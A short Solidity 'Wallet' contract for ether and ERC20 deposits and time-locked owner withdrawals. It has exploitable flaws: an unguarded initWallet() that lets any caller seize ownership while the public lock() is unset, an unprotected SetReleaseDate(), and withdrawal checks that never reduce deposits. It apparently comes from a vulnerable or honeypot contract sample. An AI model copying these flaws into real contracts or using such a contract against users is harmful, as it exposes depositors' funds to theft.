1 pragma solidity ^0.4.18;
2 
3 contract ERC20 {
4     function balanceOf(address who) constant public returns (uint256);
5     function transfer(address to, uint256 amount) public;
6 }
7 
8 contract Wallet {
9     
10     event Deposit(address indexed depositor, uint amount);
11     event Withdrawal(address indexed to, uint amount);
12     event TransferOwnership(address indexed from, address indexed to);
13     
14     address Owner;
15     function transferOwnership(address to) onlyOwner {
16         TransferOwnership(Owner, to); Owner = to;
17     }
18     
19     mapping (address => uint) public Deposits;
20     uint minDeposit;
21     bool Locked = false;
22     uint Date;
23 
24     function initWallet() payable open {
25         Owner = msg.sender;
26         minDeposit = 0.25 ether;
27         deposit();
28     }
29 
30     function SetReleaseDate(uint NewDate) {
31         Date = NewDate;
32     }
33 
34     function() public payable { deposit(); }
35 
36     function deposit() public payable {
37         if (msg.value > 0) {
38             if (msg.value >= MinimumDeposit())
39                 Deposits[msg.sender] += msg.value;
40             Deposit(msg.sender, msg.value);
41         }
42     }
43 
44     function withdraw(uint amount) public payable { withdrawTo(msg.sender, amount); }
45     
46     function withdrawTo(address to, uint amount) public onlyOwner {
47         if (WithdrawalEnabled()) {
48             uint max = Deposits[msg.sender];
49             if (max > 0 && amount <= max) {
50                 to.transfer(amount);
51                 Withdrawal(to, amount);
52             }
53         }
54     }
55 
56     function withdrawToken(address token) public payable onlyOwner {
57         if (WithdrawalEnabled())
58             withdrawTokenTo(token, msg.sender, ERC20(token).balanceOf(address(this)));
59     }
60 
61     function withdrawTokenTo(address token, address to, uint amount) public payable onlyOwner {
62         if (WithdrawalEnabled()) {
63             uint bal = ERC20(token).balanceOf(address(this));
64             if (bal >= amount && amount > 0) {
65                 ERC20(token).transfer(to, amount);
66             }
67         }
68     }
69 
70     function MinimumDeposit() public constant returns (uint) { return minDeposit; }
71     function ReleaseDate() public constant returns (uint) { return Date; }
72     function WithdrawalEnabled() constant internal returns (bool) { return Date > 0 && Date <= now; }
73     function lock() public { Locked = true; }
74     modifier onlyOwner { if (msg.sender == Owner) _; }
75     modifier open { if (!Locked) _; }
76 }